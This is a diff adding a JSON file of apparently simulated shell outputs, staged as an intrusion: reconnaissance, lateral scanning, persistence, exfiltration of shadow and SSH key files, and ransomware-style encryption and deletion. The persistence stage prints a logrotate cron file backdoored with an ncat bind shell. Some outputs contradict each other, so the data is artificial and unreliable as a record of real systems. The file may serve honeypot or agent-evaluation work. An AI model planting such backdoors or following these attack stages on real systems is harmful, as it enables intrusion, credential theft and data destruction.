@@ -1,0 +1,112 @@
+{
+  "system_reconnaissance": {
+    "step 1": "Linux prod 5.15.0-46-generic #49-Ubuntu SMP Fri Jun 17 12:16:14 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n",
+    "step 2": "processor\t: 4\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 142\nmodel name\t: Intel(R) Xeon(R) CPU E5-2699 v3 @ 2.30GHz\nstepping\t: 1\nmicrocode\t: 0x20\ncpu MHz\t: 2294.000\ncache size\t: 30752 KB\n",
+    "step 3": " [ + ]  acpid\n[ - ]  apparmor\n[ + ]  atd\n[ - ]  avahi-daemon\n[ + ]  bluetooth\n[ - ]  bootlogd\n[ + ]  cron\n[ - ]  cups\n[ + ]  dbus\n[ - ]  dns-clean\n[ + ]  irqbalance\n[ - ]  klogd\n[ + ]  lvm2-monitor\n[ - ]  nmbd\n[ + ]  networking\n[ - ]  ntpserver\n[ + ]  plymouthd\n[ - ]  rsyslogd\n[ + ]  sshd\n[ - ]  udev\n[ + ]  urandom\n[ - ]  userhelper\n[ + ]  winbind\n",
+    "step 4": "/dev/sda1        23G  2.3G   19G   11% /\n/dev/sdb1       100G  5.8G   94G    6%\n",
+    "step 5": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0  127.0.0.1:22              0.0.0.0:*               LISTEN      1234/sshd\n",
+    "step 6": "cd: /var/log: No such file or directory\n",
+    "step 7": "/home/user:\n/home/user/file1.log\n/home/user/file2.log\n/home/user\n",
+    "step 8": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\ndomain:x:2:2:domain:/var/lib/domain:/bin/sh\nuser:x:1000:1000:user,,,:/home/user:/bin/bash\n",
+    "step 9": "No jobs running.\n"
+  },
+  "system_reconnaissance_tokens": {
+    "step 1": 539,
+    "step 2": 542,
+    "step 3": 541,
+    "step 4": 540,
+    "step 5": 543,
+    "step 6": 543,
+    "step 7": 544,
+    "step 8": 718,
+    "step 9": 661
+  },
+  "scanning_lateral_propagation": {
+    "step 1": "eth0      Link encap:Ethernet  HWaddr 00:11:22:33:44:55  \n          inet addr:172.18.0.158  Bcast:172.18.255.255  Mask:255.255.0.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:1234 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:5678 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:234567 (227.3 KiB)  TX bytes:456789 (446.9 KiB)\n          Interrupt:20 Memory:f0000000-f0020000 \n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:1234 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:5678 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:234567 (227.3 KiB)  TX bytes:456789 (446.9 KiB)\n",
+    "step 2": "bytes from 172.18.0.1, icmp_seq=1 ttl=64 time=0.143 ms\\nbytes from 172.18.0.2, icmp_seq=1 ttl=64 time=0.145 ms\\nbytes from 172.18.0.3, icmp_seq=1 ttl=64 time=0.147 ms\\n...\n",
+    "step 3": "nc: invalid option -- 'z'\nTry `nc --help' for more information.\n",
+    "step 4": "/usr/bin/ssh: No such file or directory\n",
+    "step 5": "/home/user/.bashrc: permission denied\n",
+    "step 6": "% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent   Left  Speed\n\n100     41  100     41    0     0   16928      0 --:--:-- --:--:-- --:--:-- 16928\nchmod: changing permissions of '/home/user/file.sh': Operation not permitted\n",
+    "step 7": "/home/user/file.sh\n#!/usr/bin/env bash\necho \"Hello world?\"\nrm: removing symbolic link `file.sh'\n",
+    "step 8": "E: Unable to locate package nmap\n",
+    "step 9": "bash: nmap: command not found\n"
+  },
+  "scanning_lateral_propagation_tokens": {
+    "step 1": 624,
+    "step 2": 647,
+    "step 3": 647,
+    "step 4": 638,
+    "step 5": 1165,
+    "step 6": 782,
+    "step 7": 762,
+    "step 8": 762,
+    "step 9": 762
+  },
+  "persistence": {
+    "step 1": "/etc/cron.daily/logrotate modified.\n",
+    "step 2": "/etc/cron.daily/logrotate\n#!/bin/sh\nncat -lvp 15300 -e /bin/sh\n",
+    "step 3": "/etc/init.d/ippd updated successfully.\n",
+    "step 4": "/home/user/etc/init.d/ippd: /usr/sbin/pppd /dev/ttyUSB0\n",
+    "step 5": "/usr/bin/ncat\n",
+    "step 6": "/bin/sh\n",
+    "step 7": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0  127.0.0.1:25            *:*               LISTEN\nudp        0      0  127.0.0.1:123          *:*\n",
+    "step 8": "User \"john\" already exists.\n",
+    "step 9": "root:$6$4a2d7e5b9f0c3a4b2c1a9e8f7d6c5b4a3b2a1$4a2d7e5b9f0c3a4b2c1a9e8f7d6c5b4a3b2a1:17292:0:99999:7:::\n"
+  },
+  "persistence_tokens": {
+    "step 1": 552,
+    "step 2": 544,
+    "step 3": 595,
+    "step 4": 569,
+    "step 5": 568,
+    "step 6": 615,
+    "step 7": 601,
+    "step 8": 636,
+    "step 9": 600
+  },
+  "data_reconnaissance_exfiltration": {
+    "step 1": "/home:\n drwxr-xr-x 2 root root 4096 Apr 15 12:34 user\n/home/user:\n drwxr-xr-x 3 user user 4096 Apr 05 14:30 .\n drwxr-xr-x 1 user user 4096 Apr 05 14:30 ..\n",
+    "step 2": "cd: /home/phil: No such file or directory\n",
+    "step 3": "/home/user:\n drwxr-xr-x 2 user user 4096 Apr  5 12:00 .\n -rw------- 1 user user 0.0001 Apr  5 12:00 .bash_history\n",
+    "step 4": "/home/user/.bashrc: compressed to /home/user/.bashrc.gz\n",
+    "step 5": "/home/user:\n.\n..\n.bashrc.gz\next.gz\n",
+    "step 6": "/home/user/ext.gz\n",
+    "step 7": "/home/user/ext.gz\n0 0 * * * /usr/sbin/anacron -s > /dev/null 2>&1\n",
+    "step 8": "/etc/shadow:\nroot:$6$yV7zF5rj$eJL2kUxTf1uK0bW3Z4sG8pB9tIvQhXoCqRlMmNcHg3A1xP0wvY.:16714:0:99999:7:::\nbin:*:16485:0:99999:7:::\ndaemon:*:16485:0:99999:7:::\nsyslog:*:16485:0:99999:7:::",
+    "step 9": "/usr/bin/scp: /etc/shadow: Permission denied\n"
+  },
+  "data_reconnaissance_exfiltration_tokens": {
+    "step 1": 655,
+    "step 2": 655,
+    "step 3": 539,
+    "step 4": 600,
+    "step 5": 715,
+    "step 6": 775,
+    "step 7": 787,
+    "step 8": 755,
+    "step 9": 735
+  },
+  "data_obfuscation_ransomware": {
+    "step 1": "/\n",
+    "step 2": "tar: Removing leading '/' from member names\n tar: /home/user/\n tar: /home/user/.bashrc\n tar: /home/user/.bash_history\n tar: /home/user/.profile\n tar: /home/user/.ssh/authorized_keys\n tar: /home/user/.ssh/config\n tar: /home/user/.ssh/id_rsa\n tar: /home/user/.ssh/id_rsa.pub\n tar: /home/user/.ssh/id_dsa\n tar: /home/user/.ssh/id_dsa.pub\n tar: /home/user/.ssh/id_ecdsa\n tar: /home/user/.ssh/id_ecdsa.pub\n tar: /home/user/.ssh/id_ed25519\n tar: /home/user/.ssh/id_ed25519.pub\n tar: /home/user/.ssh/identity\n tar: /home/user/.ssh/identity.pub\n",
+    "step 3": "/home/user removed.\nbin\tboot\tdev\text\thome\tlib\tlib64\tmedia\tmnt\topt\tproc\trunsrv\tsys\ttmp\tusrvartmp\tvar\n",
+    "step 4": "gpg: encrypted with 1 passphrase\n",
+    "step 5": "rm: remove regular file 'home.tar'? y/N \n",
+    "step 6": "total 16\nlrwxr-xr-x   1 root root    7 May 17 13:14 /bin -> usr/bin\nlrwxr-xr-x   1 root root    8 May 17 13:14 /sbin -> usr/sbin\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 boot\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 dev\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 etc\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 home\ndlrxr-xr-x   1 root root    7 May 17 13:14 lib -> usr/lib\nlrwxr-xr-x   1 root root    8 May 17 13:14 lib64 -> usr/lib64\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 media\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 mnt\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 opt\ndr-xr-xr-x 4096 root root 4096 May 17 13:14 proc\ndrwx------ 4096 root root 4096 May 17 13:14 root\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 run\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 srv\ndr-xr-xr-x 4096 root root 4096 May 17 13:14 sys\ndrwxrwxrwt 4096 root root 4096 May 17 13:14 tmp\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 usr\ndrwxr-xr-x 4096 root root 4096 May 17 13:14 var\n",
+    "step 7": "524288+0 records in\n524288+0 records out\n536870912 bytes (537 MB) copied, 1.313 s, 409 MB/s\n",
+    "step 8": "",
+    "step 9": "1\thistory\n"
+  },
+  "data_obfuscation_ransomware_tokens": {
+    "step 1": 0,
+    "step 2": 1733,
+    "step 3": 1629,
+    "step 4": 1651,
+    "step 5": 1633,
+    "step 6": 1633,
+    "step 7": 1649,
+    "step 8": 1649,
+    "step 9": 1649
+  }
+}
